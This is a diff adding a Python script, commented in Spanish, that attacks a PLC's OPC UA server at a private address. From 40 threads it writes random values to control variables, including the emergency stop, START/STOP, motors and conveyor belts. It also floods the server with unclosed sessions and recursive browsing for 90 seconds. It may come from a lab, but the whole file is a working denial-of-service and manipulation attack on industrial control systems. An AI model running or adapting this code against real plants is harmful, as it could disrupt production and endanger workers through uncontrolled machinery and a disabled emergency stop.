@@ -1,0 +1,76 @@
+from opcua import Client
+import threading
+import time
+import random
+
+PLC_ENDPOINT = "opc.tcp://10.10.10.53:4840"
+
+VARIABLES = [
+    "ACIL_STOP", "DONER_MOTOR_1", "DONER_MOTOR_2", "DONER_MOTOR_3",
+    "GRI_BANT", "GRI_SENSOR", "MAVI_BANT", "MAVI_SENSOR",
+    "MOTOR_1", "MOTOR_3", "MOTOR_4", "MOTOR_5", "MOTOR_6",
+    "SISTEM", "START", "STOP",
+    "YAN_DONER_1", "YAN_DONER_2", "YAN_DONER_3",
+    "YESIL_BANT", "YESIL_SENSOR"
+]
+
+DURATION = 90  # segundos de ejecución
+start_time = time.time()
+
+# Ataque 1: Escritura infinita sin pausa
+def attack_writer():
+    try:
+        client = Client(PLC_ENDPOINT)
+        client.connect()
+        while time.time() - start_time < DURATION:
+            for var in VARIABLES:
+                try:
+                    node = client.get_node(f"ns=4;s=|var|{var}")
+                    node.set_value(random.choice([True, False]))
+                except:
+                    pass
+    except:
+        pass
+
+# Ataque 2: Abrir miles de sesiones sin cerrar
+def attack_sessions():
+    while time.time() - start_time < DURATION:
+        try:
+            c = Client(PLC_ENDPOINT)
+            c.connect()
+        except:
+            pass
+
+# Ataque 3: Navegación profunda e infinita
+def attack_browse():
+    try:
+        client = Client(PLC_ENDPOINT)
+        client.connect()
+        root = client.get_root_node()
+        while time.time() - start_time < DURATION:
+            try:
+                for obj in root.get_children():
+                    for c1 in obj.get_children():
+                        for c2 in c1.get_children():
+                            for c3 in c2.get_children():
+                                _ = c3.get_browse_name()
+            except:
+                pass
+    except:
+        pass
+
+# Lanzar múltiples hilos de cada ataque
+for _ in range(20):
+    threading.Thread(target=attack_writer).start()
+
+for _ in range(10):
+    threading.Thread(target=attack_sessions).start()
+
+for _ in range(10):
+    threading.Thread(target=attack_browse).start()
+
+# Esperar la duración total
+while time.time() - start_time < DURATION:
+    pass
+
+print(f"[✔] Ataque extremo finalizado tras {DURATION} segundos.")
